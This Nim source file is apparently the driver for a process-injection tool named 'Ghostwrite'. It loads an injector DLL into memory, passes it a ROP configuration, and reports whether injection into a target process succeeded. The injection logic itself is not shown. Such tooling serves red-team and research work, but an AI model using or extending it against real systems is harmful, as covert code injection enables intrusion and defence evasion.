#[
    Author: zimawhit3
    Github: https://github.com/zimawhit3
    License: BSD 3-Clause
]#
import winim/inc/winbase
import winim/[winstr, utils]
import strutils, strformat
import ../../memlib/memlib
import Modules/[defaults]
import dynlib

proc main() =
    
    when defined(cpu64):
        when defined(zima):
            const Injector = "gw.dll"
        else:
            const Injector = "gwdebug.dll"
    else:
        return
    
    proc Ghostwrite(TargetProc, TargetThread : int16 = 0, Config : string = "", Io: File = stdout) : bool {.nimcall, memlib: Injector, importc: "Ghostwrite".}

    var
        JsonData : string = ExampleROP()
    
    if Ghostwrite(Config=JsonData):
        echo fmt"[+] Successfully injected"
    else:
        echo fmt"[-] Failed to inject"

main()